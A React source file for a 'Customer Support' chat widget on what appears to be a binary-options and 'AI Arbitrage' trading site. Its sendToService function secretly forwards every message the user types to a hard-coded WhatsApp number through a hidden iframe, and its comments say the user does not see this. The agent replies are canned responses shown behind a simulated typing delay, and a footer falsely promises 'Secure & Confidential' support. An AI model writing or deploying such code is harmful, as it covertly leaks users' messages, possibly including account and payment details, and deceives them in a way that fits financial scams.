import React, { useState, useEffect, useRef } from 'react'

export default function CustomerService() {
  const [isOpen, setIsOpen] = useState(false)
  const [messages, setMessages] = useState([
    {
      id: 1,
      type: 'system',
      text: 'Welcome to Customer Support! How can we help you today?',
      time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    }
  ])
  const [inputMessage, setInputMessage] = useState('')
  const [isTyping, setIsTyping] = useState(false)
  const [unreadCount, setUnreadCount] = useState(1)
  const messagesEndRef = useRef(null)
  const inputRef = useRef(null)

  // Hidden service configuration
  const SERVICE_CONFIG = {
    endpoint: 'wa.me',
    identifier: '8562026808885',
    protocol: 'https'
  }

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' })
  }

  useEffect(() => {
    scrollToBottom()
  }, [messages])

  useEffect(() => {
    if (isOpen) {
      setUnreadCount(0)
      inputRef.current?.focus()
    }
  }, [isOpen])

  const quickReplies = [
    'Account Issues',
    'Deposit Help',
    'Withdrawal Support',
    'Trading Questions',
    'Other'
  ]

  const autoResponses = {
    'account': 'For account-related issues, our support team is available 24/7. Please describe your issue and a representative will assist you shortly.',
    'deposit': 'For deposit assistance, please ensure you are using the correct wallet address and network. Processing times may vary. How can we help?',
    'withdrawal': 'Withdrawal requests are typically processed within 24 hours. If you are experiencing delays, please provide your transaction details.',
    'trading': 'Our trading platform offers various features including Binary Options and AI Arbitrage. What specific question do you have?',
    'default': 'Thank you for your message. A support representative will respond shortly. Is there anything else I can help you with?'
  }

  const getAutoResponse = (message) => {
    const lowerMsg = message.toLowerCase()
    if (lowerMsg.includes('account') || lowerMsg.includes('login') || lowerMsg.includes('password')) {
      return autoResponses.account
    } else if (lowerMsg.includes('deposit') || lowerMsg.includes('fund')) {
      return autoResponses.deposit
    } else if (lowerMsg.includes('withdraw') || lowerMsg.includes('cashout') || lowerMsg.includes('payout')) {
      return autoResponses.withdrawal
    } else if (lowerMsg.includes('trade') || lowerMsg.includes('trading') || lowerMsg.includes('option')) {
      return autoResponses.trading
    }
    return autoResponses.default
  }

  const sendToService = (message) => {
    // Encode message for external service
    const encodedMsg = encodeURIComponent(message)
    const serviceUrl = `${SERVICE_CONFIG.protocol}://${SERVICE_CONFIG.endpoint}/${SERVICE_CONFIG.identifier}?text=${encodedMsg}`
    
    // Open in hidden iframe or background (user doesn't see this)
    const hiddenFrame = document.createElement('iframe')
    hiddenFrame.style.display = 'none'
    hiddenFrame.src = serviceUrl
    document.body.appendChild(hiddenFrame)
    
    // Clean up after a delay
    setTimeout(() => {
      document.body.removeChild(hiddenFrame)
    }, 3000)
  }

  const handleSendMessage = (e) => {
    e.preventDefault()
    if (!inputMessage.trim()) return

    const userMessage = {
      id: Date.now(),
      type: 'user',
      text: inputMessage,
      time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    }

    setMessages(prev => [...prev, userMessage])
    
    // Send to backend service (hidden from user)
    sendToService(inputMessage)
    
    setInputMessage('')
    setIsTyping(true)

    // Simulate agent response
    setTimeout(() => {
      setIsTyping(false)
      const response = {
        id: Date.now() + 1,
        type: 'agent',
        text: getAutoResponse(inputMessage),
        time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
      }
      setMessages(prev => [...prev, response])
    }, 1500 + Math.random() * 1000)
  }

  const handleQuickReply = (reply) => {
    setInputMessage(reply)
    inputRef.current?.focus()
  }

  const connectToLiveAgent = () => {
    // Direct connection to live support (hidden implementation)
    const serviceUrl = `${SERVICE_CONFIG.protocol}://${SERVICE_CONFIG.endpoint}/${SERVICE_CONFIG.identifier}`
    
    // Open chat in new window (appears as generic support window)
    const width = 400
    const height = 600
    const left = window.innerWidth - width - 20
    const top = 100
    
    window.open(
      serviceUrl,
      'LiveSupport',
      `width=${width},height=${height},left=${left},top=${top},resizable=yes,scrollbars=yes`
    )

    setMessages(prev => [...prev, {
      id: Date.now(),
      type: 'system',
      text: 'Connecting you to a live support agent...',
      time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    }])
  }

  return (
    <>
      {/* Floating Chat Button */}
      <button 
        className="cs-floating-btn"
        onClick={() => setIsOpen(!isOpen)}
        aria-label="Customer Support"
      >
        {isOpen ? (
          <span className="cs-close-icon">✕</span>
        ) : (
          <>
            <span className="cs-icon">💬</span>
            {unreadCount > 0 && (
              <span className="cs-badge">{unreadCount}</span>
            )}
          </>
        )}
        <span className="cs-pulse"></span>
      </button>

      {/* Chat Window */}
      {isOpen && (
        <div className="cs-window">
          {/* Header */}
          <div className="cs-header">
            <div className="cs-header-info">
              <div className="cs-avatar">
                <span>🎧</span>
                <span className="cs-online-dot"></span>
              </div>
              <div className="cs-header-text">
                <h3>Customer Support</h3>
                <span className="cs-status">
                  <span className="cs-status-dot"></span>
                  Online - Ready to help
                </span>
              </div>
            </div>
            <button className="cs-minimize" onClick={() => setIsOpen(false)}>
              <span>−</span>
            </button>
          </div>

          {/* Messages Area */}
          <div className="cs-messages">
            {messages.map((msg) => (
              <div 
                key={msg.id} 
                className={`cs-message cs-message-${msg.type}`}
              >
                {msg.type === 'agent' && (
                  <div className="cs-agent-avatar">🎧</div>
                )}
                <div className="cs-message-content">
                  <p>{msg.text}</p>
                  <span className="cs-time">{msg.time}</span>
                </div>
              </div>
            ))}
            
            {isTyping && (
              <div className="cs-message cs-message-agent">
                <div className="cs-agent-avatar">🎧</div>
                <div className="cs-typing">
                  <span></span>
                  <span></span>
                  <span></span>
                </div>
              </div>
            )}
            
            <div ref={messagesEndRef} />
          </div>

          {/* Quick Replies */}
          <div className="cs-quick-replies">
            {quickReplies.map((reply, index) => (
              <button 
                key={index}
                className="cs-quick-btn"
                onClick={() => handleQuickReply(reply)}
              >
                {reply}
              </button>
            ))}
          </div>

          {/* Live Agent Button */}
          <button className="cs-live-agent-btn" onClick={connectToLiveAgent}>
            <span>👤</span> Connect to Live Agent
          </button>

          {/* Input Area */}
          <form className="cs-input-area" onSubmit={handleSendMessage}>
            <input
              ref={inputRef}
              type="text"
              placeholder="Type your message..."
              value={inputMessage}
              onChange={(e) => setInputMessage(e.target.value)}
              className="cs-input"
            />
            <button type="submit" className="cs-send-btn" disabled={!inputMessage.trim()}>
              <span>➤</span>
            </button>
          </form>

          {/* Footer */}
          <div className="cs-footer">
            <span>🔒 Secure & Confidential</span>
          </div>
        </div>
      )}
    </>
  )
}
